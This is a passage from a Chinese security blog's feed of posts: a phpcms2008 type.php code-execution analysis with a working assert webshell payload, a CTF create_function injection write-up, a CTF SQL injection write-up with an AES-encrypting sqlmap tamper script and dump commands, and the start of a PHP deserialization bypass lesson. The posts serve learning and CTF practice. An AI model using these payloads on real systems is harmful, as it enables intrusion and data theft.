class="string">"$tplfile is not exists!"</span>);</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">$content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</div><div class="line">$strlen = file_put_contents($compiledtplfile, $content);</div><div class="line">@chmod($compiledtplfile, <span class="number">0777</span>);</div><div class="line"><span class="keyword">return</span> $strlen;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>此时$temlate经过拼接赋值给了$tplfile，$tpfile的值变为了：</strong></p><pre><code>/templates/default/phpcms/tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.html</code></pre><p><strong>之后<code>file_get_contents</code>会读取$tpfle这个文件的内容，如果文件不存在就会直接结束执行，但是这里的路径同样存在目录穿越的问题，实际上读取的路径为/templates/default/phpcms/rss.html这个文件，而这个文件是存在的，此处利用了路径穿越巧妙的绕过了此处的检查，之后<code>template_parse</code>函数将$tplfile文件当中的html代码编译成为php代码，然后和$template变量的内容拼接后写入到了$compiledtplfile这个文件中，也就是/data/cache<em>template/rss.tpl.php这个文件，这里要求template的前四个字符为`tag</em>`，payload的构造符合了要求，这时候php恶意代码就成功写入到了模板缓存文件内，产生了代码执行</strong></p><p><strong>写入的/data/cache_template/rss.tpl.php内的恶意代码为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">_tag_phpcms_tag_</span><span class="params">()</span></span>&#123;&#125;;@unlink(_FILE_);assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);<span class="meta">?&gt;</span>'.template_parse($content, 1).'<span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181221/nFxXup4DpuRj.png" alt="mark"></p><h3 id="关于payload构造的几个问题："><a href="#关于payload构造的几个问题：" class="headerlink" title="关于payload构造的几个问题："></a>关于payload构造的几个问题：</h3><p><strong>1.为什么加unlink？</strong></p><p><strong>其实可以不加，仔细看的话可以看到此处的unlink里面的参数书写的也不对并不会执行，加unlink的原因只是为了语法正确而已，经过测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tag_()&#123;&#125;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss也可以成功</span></div><div class="line">tag_()&#123;&#125;;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss会失败</span></div><div class="line">tag_()&#123;&#125;;php代码;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss成功</span></div></pre></td></tr></table></figure><p><strong>2.为什么加//</strong></p><p><strong>为了注释后面的代码，避免产生语法错误，不明白的可以看上图中的代码</strong></p><p><strong>3.{这个符号</strong></p><p><strong>因为后面的注释注释掉了{,所以需要加一个{去闭合代码最后的},否则会出语法错误</strong></p><h3 id="ayload构造"><a href="#ayload构造" class="headerlink" title="ayload构造:"></a>ayload构造:</h3><p><strong>1.简化后的payload：</strong></p><pre><code>type.php?template=tag_(){}assert($_GET[1]);{//../rss</code></pre><h3 id="漏洞总结："><a href="#漏洞总结：" class="headerlink" title="漏洞总结："></a>漏洞总结：</h3><p><strong>该漏洞可以总结为：代码根据传入的参数将/templates/default/phpcms目录下对应的.html模板文件渲染生成为/data/cache_template目录下.tpl.php模板缓存文件的这个过程中，由于输入是可控的，导致可以将php恶意代码写入php文件当中，从而产生任意代码执行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpcms2008-type-php代码执行漏洞分析与复现&quot;&gt;&lt;a href=&quot;#phpcms2008-type-php代码执行漏洞分析与复现&quot; class=&quot;headerlink&quot; title=&quot;phpcms2008 type.php代码执行漏洞分析与复现&quot;&gt;
      
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking Puzzles挑战</title>
    <link href="https://c1aysec.github.io/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/"/>
    <id>https://c1aysec.github.io/2018/11/30/Code-Breaking Puzzles挑战/</id>
    <published>2018-11-30T11:00:05.000Z</published>
    <updated>2019-11-08T14:10:15.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles挑战"><a href="#Code-Breaking-Puzzles挑战" class="headerlink" title="Code-Breaking Puzzles挑战"></a>Code-Breaking Puzzles挑战</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>来自P师傅小密圈二周年的Code-Breaking Puzzles挑战的题目</strong></p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p><strong>题目代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</div><div class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $action(<span class="string">''</span>, $arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>题目环境为PHP/7.2.12加上Apache/2.4.25 (Debian)</strong></p><p><strong>首先通过<code>$action(&#39;&#39;, $arg);</code>可以想到PHP的动态代码执行，通过这里面的参数可以看出这里应该使用<code>create_function</code>这个函数去进行代码执行，关于这个函数的执行流程如下：</strong></p><pre><code>1.获取参数, 函数体;2.拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;3.eval;4.通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;5.定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;6.用新的函数名替换__lambda_func;7.返回新的函数。</code></pre><p><strong>以上流程可以简单理解为在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段，看下面的代码实例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $func=create_function(<span class="string">'$a,$b'</span>,<span class="string">'echo $a+$b;'</span>);</div><div class="line">    $func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="comment">//3</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这段代码的执行过程等价于</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">($a,b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a+$b;</div><div class="line">&#125;</div><div class="line">    anonymous_func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>于是有了一个思路，这里可以传入<code>action=create_function&amp;arg=}phpinfo();/*</code>去执行phpinfo,这样构造的原因是因为这里通过<code>create_function</code>生成的匿名函数并没有赋值给任何变量，所以无法调用该匿名函数，但是由于此处的环境是php的<code>eval</code>环境，所以可以通过<code>}</code>去闭合该匿名函数，之后就执行任意代码了，而这里的<code>/*</code>用来注释后面多出的代码，这里执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>,<span class="string">'&#125;phpinfo();/*'</span>);</div></pre></td></tr></table></figure><p><strong>实际执行过程变为了如下代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">()</span></span>&#123;&#125;phpinfo();\*&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p><strong>于是便可以成功执行phpinfo,但是这道题里只是这样构造是不可以的，这里还需要绕过对传入的<code>$action</code>的正则检查，通过正则可以看出<code>$action</code>的内容不能只包含数字字母和<code>_</code>，在这里面卡了好久，于是看了P牛师傅的讲解，这里可以通过在函数名前加上<code>\</code>去绕过，构造<code>action=\create_function&amp;arg=}phpinfo();/*</code>就可以成功执行phpinfo</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/oNzIUYcJHOL4.png" alt="mark"></p><p><strong>至于函数前面为什么可以加<code>\</code>,P牛师傅也给出了详细的解释，这里用到了php当中的命名空间，在php当中有一个默认的命名空间为<code>\</code>，PHP当中的所有原生函数和类都在这个命名空间下，平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上<code>\</code>用的是绝对路径去调用函数</strong></p><p><strong>接下来尝试使用命令执行函数执行命令，但是发现命令执行函数都被禁用掉了</strong><br><img src="http://pic.c1imber.top/blog/20181130/i3Ar2ajDTduJ.png" alt="mark"></p><p><strong>只能通过执行代码的方式寻找flag文件了</strong></p><p><strong>寻找flag文件的位置</strong></p><pre><code>action=\create_function&amp;arg=}print_r(scandir(&quot;/var/www/&quot;));/*</code></pre><p><strong>找到flag文件的位置在<code>/var/www</code>目录下</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/lv67vOhsSTJO.png" alt="mark"></p><p><strong>读取flag</strong></p><pre><code>action=\create_function&amp;arg=}echo file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);/*</code></pre><p><img src="http://pic.c1imber.top/blog/20181130/LHgNeuJvbjkm.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles挑战&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles挑战&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking Puzzles挑战&quot;&gt;&lt;/a&gt;Code-Breaking Puz
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018湖湘杯注入题writeup</title>
    <link href="https://c1aysec.github.io/2018/11/19/2018%E6%B9%96%E6%B9%98%E6%9D%AF%E6%B3%A8%E5%85%A5%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2018/11/19/2018湖湘杯注入题writeup/</id>
    <published>2018-11-19T11:30:56.000Z</published>
    <updated>2018-12-20T01:51:42.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018湖湘杯注入题writeup"><a href="#2018湖湘杯注入题writeup" class="headerlink" title="2018湖湘杯注入题writeup"></a>2018湖湘杯注入题writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这段时间事情很多，导致这次比赛没有报上名，周日总算闲了下来，看到师傅在群里发了几个题目的链接，于是滑了一波水，在这里记录一下</strong></p><h3 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB Code Check"></a>WEB Code Check</h3><p><strong>其实昨天写这道题的时候并不知道这个题的题目是什么（有点尴尬），打开题目发现是一个登陆框，进行正常的登陆流程时会出现如下的错误，所以猜测该登陆功能可能不能正常使用</strong><br><img src="http://pic.c1imber.top/blog/20181119/4OOqnC1qMaXC.png" alt="mark"><br><strong>看到登陆处显示平台正在停机维护，不能正常使用应该和这个有一些关系吧</strong><br><img src="http://pic.c1imber.top/blog/20181119/pIrsEaltyAY1.png" alt="mark"><br><strong>接下来查看页面源代码，尝试发现问题，看到有一处连接</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/6bNnKTXanQT5.png" alt="mark"><br><strong>打开后是一个显示信息的页面</strong><br><img src="http://pic.c1imber.top/blog/20181119/kPv8QXKJFJmq.png" alt="mark"><br><strong>id参数可能是存在注入的，id的值看起来像是一串base64，于是猜测可能是base64编码后的sql注入，但是在尝试base64解码的时候，第二次解码的时候就不能解码了，会出现乱码</strong></p><p><strong>接下来，偶然发现了一处目录遍历，此处泄露了list.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20181119/vBzDRTmHetEN.png" alt="mark"></p><p><strong>list.php源码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</div><div class="line"><span class="comment">//解密过程</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$id=decode($_GET[<span class="string">'id'</span>]);</div><div class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</div><div class="line">$info=$link-&gt;query($sql);</div><div class="line">$arr=$info-&gt;fetch_assoc();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</div><div class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</div><div class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="body"&gt;</div><div class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</div><div class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>可以看到此处的id参数进行了AES加密处理，加密模式为CBC模式，之后服务端会对id参数进行解密，之后将解密的结果拼接进sql语句，从而产生了sql注入，源码中泄露了AES加密解密的key(密钥)和iv(初始化向量)，有了key和iv这两部分，就可以随意的构造sql注入的payload了</strong></p><p><strong>解密代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $data=<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/uGcgDrNkBPfE.png" alt="mark"></p><p><strong>根据解密的代码，结合泄露的key和iv，很容易的编写出生成payload的加密代码，构造延时注入的POC，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$payload=<span class="string">"1 and sleep(5)-- hxb2018"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = base64_encode(base64_encode(mcrypt_generic($td,$payload)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/L3YFbRXIz7mV.png" alt="mark"></p><p><strong>将经过处理的POC传入到id参数请求</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</code></pre><p><strong>发现页面响应延时了5s，说明sql语句执行了，确实是存在注入的</strong><br><img src="http://pic.c1imber.top/blog/20181119/FeHLwaKWIQcn.png" alt="mark"></p><p><strong>为了方便，用python编写sqlmap的tamper脚本对id参数进行相应的处理，实现自动化注入，代码如下:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#编写sqlmap tamper脚本aes_cbc.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></div><div class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.NORMAL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    hxb2018:AES CBC encrypt sql injection</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    &gt;&gt;&gt; tamper('1 and sleep(5)-- ')</span></div><div class="line"><span class="string">    dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">return</span> encrypt(payload)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></div><div class="line">    payload=payload+<span class="string">"hxb2018"</span></div><div class="line">    key=<span class="string">"ydhaqPQnexoaDuW3"</span></div><div class="line">    iv=<span class="string">"2018201920202021"</span></div><div class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</div><div class="line">    <span class="keyword">if</span>(len(payload)%<span class="number">16</span>!=<span class="number">0</span>):</div><div class="line">        payload=payload+(<span class="string">'\0'</span>*(<span class="number">16</span>-len(payload)%<span class="number">16</span>))</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div></pre></td></tr></table></figure><p><strong>sqlmap判断存在注入</strong><br>    sqlmap -u “<a href="http://39.108.176.234:49882/news/list.php?id=1" target="_blank" rel="external">http://39.108.176.234:49882/news/list.php?id=1</a>“ –tamper “aes_cbc.py”</p><p><img src="http://pic.c1imber.top/blog/20181119/UekYVNUV0sqg.png" alt="mark"></p><p><strong>获取flag</strong></p><pre><code>sqlmap -u &quot;http://39.108.176.234:49882/news/list.php?id=1&quot; --tamper &quot;aes_cbc.py&quot; --dump -T &quot;notice2&quot; -D &quot;mozhe_discuz_stormgroup&quot;</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/J0LVhOx3QhPD.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;a href=&quot;#2018湖湘杯注入题writeup&quot; class=&quot;headerlink&quot; title=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;/a&gt;2018湖湘杯注入题writeup&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞学习-绕过_wakeup()函数</title>
    <link href="https://c1aysec.github.io/2018/10/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/"/>
    <id>https://c1aysec.github.io/2018/10/26/PHP反序列化漏洞学习-绕过_wakeup()函数/</id>
    <published>2018-10-26T09:35:30.000Z</published>
    <updated>2019-11-08T14:25:04.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞学习-绕过-wakeup-函数"><a href="#PHP反序列化漏洞学习-绕过-wakeup-函数" class="headerlink" title="PHP反序列化漏洞学习-绕过_wakeup()函数"></a>PHP反序列化漏洞学习-绕过_wakeup()函数</h1><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p><strong>代码如下，要求利用php反序列化漏洞去读取<code>flag.php</code>文件中的内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </div><div class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </div><div class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</div><div class="line">       <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</div><div class="line">          show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</div><div class="line">       <span class="keyword">else</span>      <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</div><div class="line">      &#125;&#125;  </div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; &#125; </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">''</span> ;&#125;&#125;     </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; show_source(<span class="string">'index.php'</span>); &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </div><div class="line">       <span class="keyword">echo</span> unserialize($file ); &#125; </div><div class="line"><span class="meta">?&gt;</span>   <span class="comment">#&lt;!--key in flag.php--&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="php反序列化简单介绍"><a href="#php反序列化简单介绍" class="headerlink" title="php反序列化简单介绍"></a>php反序列化简单介绍</h3><p><strong>根据php官方文档的介绍，php反序列化用于在开发中存储或传递php的值，同时又不丢失其类型和结构，php当中和反序列化有关的两个重要函数，分别为<code>serialize</code>和<code>unserialize</code>，这两个函数可以处理除<code>resource</code>(资源类型)之外的任何php数据类型，对php值进行序列化和反序列化操作</strong></p><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p><strong>php反序列化本身其实是没有危害的，但是当对一个php对象进行序列化或者反序列化操作时，由于对象里面的一些魔术方法会在一些情况下被触发，刚好这些魔术方法里面调用了一些危害的函数并且函数的参数是我们可以控制的，就会产生预料之外的危害，有关php对象的一些常见魔术方法如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">__construct<span class="comment">//在对象创建时触发</span></div><div class="line">__destruct<span class="comment">//在对象销毁时触发</span></div><div class="line">__sleep<span class="comment">//在对象序列化之前触发</span></div><div class="line">__wakeup<span class="comment">//在反序列化还原对象之前触发</span></div><div class="line">__toString<span 